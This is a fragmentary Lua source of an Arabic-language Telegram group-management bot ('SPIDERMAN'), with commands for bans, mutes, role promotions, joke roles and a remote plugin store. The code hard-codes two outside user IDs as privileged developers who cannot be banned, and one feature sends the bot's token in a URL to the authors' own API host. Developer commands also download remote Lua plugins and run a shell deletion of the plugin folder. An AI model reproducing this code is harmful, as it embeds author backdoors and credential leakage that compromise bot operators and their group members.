...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1336280373,1740306080}
...
print("\27[34m"..[[
   _____ _____ _____ _____  ______ _____  __  __          _   _ 
  / ____|  __ \_   _|  __ \|  ____|  __ \|  \/  |   /\   | \ | |
 | (___ | |__) || | | |  | | |__  | |__) | \  / |  /  \  |  \| |
  \___ \|  ___/ | | | |  | |  __| |  _  /| |\/| | / /\ \ | . ` |
  ____) | |    _| |_| |__| | |____| | \ \| |  | |/ ____ \| |\  |
 |_____/|_|   |_____|_____/|______|_|  \_\_|  |_/_/    \_\_| \_|                           
 > CH › @JJU6UU
> CH › @JJJ6UU
~> DEVELOPER › @lll_lll4]].."\27[m")
...
if hash or Bot(msg) or DevSPIDERMAN(msg) or DevBotsIs(msg) then    
return true  
else  
return false  
end  
...
if hash or Bot(msg) or DevSPIDERMAN(msg) or DevBot(msg) or DevBotsIs(msg) then     
return true 
else 
return false 
end 
...
if hash or Bot(msg) or DevSPIDERMAN(msg) or DevBot(msg) or DevBotsIs(msg) or creatorA(msg) then     
return true 
else 
return false 
end 
...
if hash or Bot(msg) or DevSPIDERMAN(msg) or DevBot(msg) or BasicConstructor(msg) or DevBotsIs(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
...
if hash or Bot(msg) or DevSPIDERMAN(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or DevBotsIs(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
...
if hash or Bot(msg) or DevSPIDERMAN(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or DevBotsIs(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
...
if hash or Bot(msg) or  DevSPIDERMAN(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) or DevBotsIs(msg) or creatorA(msg) then             
return true 
else 
return false 
end 
...
if DevSPIDERMANe(user_id) == true then
var = true
elseif DevSPIDERMAN(user_id) == true then
var = true
...
var = true  
elseif tonumber(user_id) == tonumber(1740306080) then
var = true  
...
elseif DevSPIDERMANe(user_id) == true then
var = "المطور الاساسي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = "البوت"
...
duration_ = "",
title_ = title or "",
performer_ = "سورس سبايدر مان الرسمي",
caption_ = caption or ""
}},func or dl_cb,nil)
end
...
local UserName = (data.username_ or "JJJ6UU")
...
function SPIDERMAN_Started_Bot(msg,data) -- بداية العمل
if msg then
...
local SPIDERMAN_Msg = database:sismember(bot_id.."List:Filter:text"..msg.chat_id_,text) 
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_SPIDERMAN, nil)
return false 
end
...
if text == ("الثانويين") and DevSPIDERMAN(msg) then
...
if text == ("مسح المطورين") and DevSPIDERMAN(msg) then
...
if text == ("قائمه كتم عام") and DevSPIDERMAN(msg) then
...
if text and text:match("^حظر عام @(.*)$")  and DevSPIDERMAN(msg) then
...
if result.id_ == tonumber(1740306080) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} Telegram Developer \n")
return false
end
if result.id_ == tonumber(1336280373) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
...
if text and text:match("^حظر عام (%d+)$") and DevSPIDERMAN(msg) then
local userid = text:match("^حظر عام (%d+)$")
if userid == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت الاساسي \n")
return false 
end
if userid == tonumber(1336280373) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if userid == tonumber(1740306080) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} Telegram Developer \n")
return false
end
...
if text == ("كتم عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSPIDERMAN(msg) then
function Function_SPIDERMAN(extra, result, success)
if result.sender_user_id_ == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت الاساسي \n")
return false 
...
if text and text:match("^كتم عام @(.*)$")  and DevSPIDERMAN(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevSPIDERMAN(msg) then
...
if text == ("الغاء العام") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSPIDERMAN(msg) then
function Function_SPIDERMAN(extra, result, success)
...
if text and text:match("^الغاء العام @(.*)$") and DevSPIDERMAN(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevSPIDERMAN(msg) then
...
if text == ("اضف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSPIDERMAN(msg) then
function Function_SPIDERMAN(extra, result, success)
...
if text and text:match("^اضف مطور @(.*)$") and DevSPIDERMAN(msg) then
...
if text and text:match("^اضف مطور (%d+)$") and DevSPIDERMAN(msg) then
local userid = text:match("^اضف مطور (%d+)$")
database:sadd(bot_id.."Sudo:User", userid)
Reply_Status(msg,userid,"reply","✫: تم ترقيته مطور في البوت")  
return false 
end
if text == ("حذف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSPIDERMAN(msg) then
function Function_SPIDERMAN(extra, result, success)
...
if text and text:match("^حذف مطور @(.*)$") and DevSPIDERMAN(msg) then
...
if text and text:match("^حذف مطور (%d+)$") and DevSPIDERMAN(msg) then
...
------------------------------------------------------------------------
if text == 'تنزيل المطايه' and Addictive(msg) then
...
-----------------------------------------------------
if text == 'تنزيل الحاتات' and Addictive(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✫∫ تم مسح جميع المطايه')
end
if text == ("تاك للحاتات") and Addictive(msg) then
...
---------
if text == ("رفع الحاته") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل الحاته")) and msg.reply_to_message_id_ and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تاك للحات") and Addictive(msg) then
...
---------
if text == ("رفع الحات") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل الحات")) and msg.reply_to_message_id_ and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-----------------------------------------------------
if text == 'تنزيل الجلاب' and Addictive(msg) then
...
---------
if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع حصان") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل حصان")) and msg.reply_to_message_id_ and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع جريذي") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل جريذي")) and msg.reply_to_message_id_ and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local SPIDERMANrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if SPIDERMANrt == "مميز" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"✫: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "JJJ6UU")..")".."\n✫: تم رفعه "..RTPA.." هنا\n")
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id.."Special:User"..msg.chat_id_,result.sender_user_id_)  
elseif SPIDERMANrt == "ادمن" and Owner(msg) then 
send(msg.chat_id_, msg.id_,"✫: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "JJJ6UU")..")".."\n✫: تم رفعه "..RTPA.." هنا\n")
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id.."Mod:User"..msg.chat_id_,result.sender_user_id_)  
elseif SPIDERMANrt == "مدير" and Constructor(msg) then
send(msg.chat_id_, msg.id_,"✫: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "JJJ6UU")..")".."\n✫: تم رفعه "..RTPA.." هنا\n")
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id.."Manager"..msg.chat_id_,result.sender_user_id_)  
elseif SPIDERMANrt == "عضو" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"✫: العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "JJJ6UU")..")".."\n✫: تم رفعه "..RTPA.." هنا\n")
end
end,nil)   
end   
...
if result.id_ then
local SPIDERMANrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if SPIDERMANrt == "مميز" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"✫: العضو -› ["..result.title_.."](t.me/"..(text1[3] or "JJJ6UU")..")".."\n✫: تم رفعه "..text1[2].." هنا")   
database:sadd(bot_id.."Special:User"..msg.chat_id_,result.id_)  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✫> العضو > ['..data.first_name_..'](t.me/'..(data.username_ or 'JJJ6UU')..') ~'
...
usertext = '\n✫ العضو > ['..result.title_..'](t.me/'..(username or 'JJJ6UU')..')'
status  = '\n✫ تم تقيده لمدة  { '..TextEnd[2]..' '..TextEnd[3]..'}'
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✫:  العضو -› ['..data.first_name_..'](t.me/'..(data.username_ or 'SPIDERMAN')..') '
...
------------------------------------------------------------------------
if text == ("مسح ردود المطور") and DevSPIDERMAN(msg) then 
...
if text == ("ردود المطور") and DevSPIDERMAN(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n✫: قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
...
if text == "اضف رد للكل" and DevSPIDERMAN(msg) then 
send(msg.chat_id_, msg.id_,"✫:  ارسل الكلمه التري تريد اضافتها")
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد للكل" and DevSPIDERMAN(msg) then 
...
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'JJJ6UU')..')'
...
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 and
                    not database:get(bot_id .. 'SPIDERMAN:Lock:ID:Bot' .. msg.chat_id_) then
                    function Function_SPIDERMAN(extra, result, success)
                        tdcli_function({
                            ID = "GetUser",
...
local UserName = (b.username_ or "JJJ6UU")
...
if text == "تعطيل المغادره" and DevSPIDERMAN(msg) then  
database:set(bot_id.."Left:Bot"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "✫: تم تعطيل مغادرة البوت") 
return false 
end
if text == (database:get(bot_id.."Name:Bot") or "سبايدر مان") then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
Namebot = (database:get(bot_id.."Name:Bot") or "سبايدر مان")
local namebot = {
...
if database:get(bot_id.."Status:Bc") and not DevSPIDERMAN(msg) then 
...
if text == ("تحديث السورس") and DevSPIDERMAN(msg) then  
...
zh = https.request('https://SPIDERMAN-api.ml/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n✫️ : قائمه الزخرفه \n — — — — — — — — — \n"
i = 0
...
gk = https.request('https://SPIDERMAN-api.ml/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
...
ge = https.request('https://SPIDERMAN-api.ml/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
send(msg.chat_id_, msg.id_, ag.ok.hso)
end
if text == 'السيرفر' and DevSPIDERMAN(msg) then 
...
data,res = https.request('https://SPIDERMAN-api.ml/infoInstagram.php?username='..URL.escape(Textni)..'')
if res == 200 then
...
data,res = https.request('https://SPIDERMAN-api.ml/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
...
if text == "غنيلي" then
data,res = https.request('https://SPIDERMAN-api.ml/audios.php')
if res == 200 then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '- sᴏᴜʀᴄʀ 𝚂𝙿𝙸𝙳𝙴𝚁𝙼𝙰𝙽 .',url="t.me/JJJ6UU"}},
}
local msg_id = msg.id_/2097152/0.5
...
st = https.request('https://SPIDERMAN-api.ml/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
...
Srrt = https.request('https://SPIDERMAN-api.ml/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
...
if text and text:match("^تعين عدد الاعضاء (%d+)$") and DevSPIDERMAN(msg) then
...
if text == 'جلب نسخه احتياطيه' and DevSPIDERMAN(msg) then
local list = database:smembers(bot_id..'Chek:Groups')  
local memo = database:smembers(bot_id..'UsersBot')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
...
if text == 'الملفات' and DevSPIDERMAN(msg) then
t = '✫: جميع الملفات : \n — — — — — — — — — \n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
...
if DevSPIDERMAN(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SPIDERMAN-DeV/files_SPIDERMAN/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n✫: اهلا بك في متجر ملفات سبايدر مان\n✫: يوجد في المتجر ملف الردود \n — — — — — — — — — \n"
...
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") and DevSPIDERMAN(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/SPIDERMAN-DeV/files_SPIDERMAN/main/files_SPIDERMAN/"..file)
if res == 200 then
...
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") and DevSPIDERMAN(msg) then
...
if text == "مسح جميع الملفات" and DevSPIDERMAN(msg) then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"✫: تم حذف جميع الملفات")
return false
end
if text == 'نقل الاحصائيات' and DevSPIDERMAN(msg) then
...
if text == 'حذف كليشه المطور' and DevSPIDERMAN(msg) then
database:del(bot_id..'Text_Dev')
send(msg.chat_id_, msg.id_,'✫:  تم حذف كليشه المطور')
end
if text == 'وضع كليشه المطور' and DevSPIDERMAN(msg) then
...
if text == 'رفع النسخه الاحتياطيه' and DevSPIDERMAN(msg) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
Text = "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄʀ 𝚂𝙿𝙸𝙳𝙴𝚁𝙼𝙰𝙽\n\n[-  𝚂𝙿𝙸𝙳𝙴𝚁𝙼𝙰𝙽 ᴄʜᴀɴɴᴇʟ . ](t.me/JJU6UU)\n[-  ɪɴғᴏ sᴏᴜʀᴄᴇ .](t.me/JJJ6UU )\n[-  𝚂𝙿𝙸𝙳𝙴𝚁𝙼𝙰𝙽 ᴅᴇᴠᴇʟᴏᴘᴇʀ  .](t.me/lll_lll4 )\n[-  ʙᴏᴛ 𝚂𝙿𝙸𝙳𝙴𝚁𝙼𝙰𝙽 .](t.me/VVV3VBOT )"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✫: sᴏᴜʀᴄʀ 𝚂𝙿𝙸𝙳𝙴𝚁𝙼𝙰𝙽 .',url="t.me/JJJ6UU"}},
}
...
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSPIDERMAN(msg) then
...
if not DevSPIDERMAN(msg) and not database:sismember(bot_id..'BaN:In:User',msg.sender_user_id_) and not database:get(bot_id..'Texting:In:Bv') and not database:get(bot_id.."Filter"..msg.sender_user_id_) then
...
if DevSPIDERMAN(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,'✫: [تحديثات البوت](t.me/JJJ6UU) .\n - [قناه السورس](t.me/JJU6UU) .')
return false  
end
...
if text and text:match("^- تغير الاشتراك ✫ .$") and DevSPIDERMAN(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✫: حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^- تغير رساله الاشتراك ✫ .$") and DevSPIDERMAN(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✫: حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ✫ ." and DevSPIDERMAN(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "✫: تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^- تعين قناة الاشتراك ✫ .$") and DevSPIDERMAN(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✫: حسنآ ارسل لي معرف القناة')
return false  
end
if text == "- تفعيل الاشتراك الاجباري ✫ ." and DevSPIDERMAN(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == ("قائمه المكتومين العام ✫") and DevSPIDERMAN(msg) then
local list = database:smembers(bot_id.."GMuted:User")
...
inline = {
{{text = '✫:  - sᴏᴜʀᴄʀ 𝚂𝙿𝙸𝙳𝙴𝚁𝙼𝙰𝙽  .',url='http://t.me/JJJ6UU'}},
}
...
local Name_Bot = (database:get(bot_id.."Name:Bot") or "سبايدر مان")
...
------------------------------------------------------------------------
SPIDERMAN_Started_Bot(msg,data)
Files(msg)
...
------------------------------------------------------------------------
if text then
local SPIDERMAN_Msg = database:sismember(bot_id.."List:Filter:text"..result.chat_id_,text) 
if SPIDERMAN_Msg then    
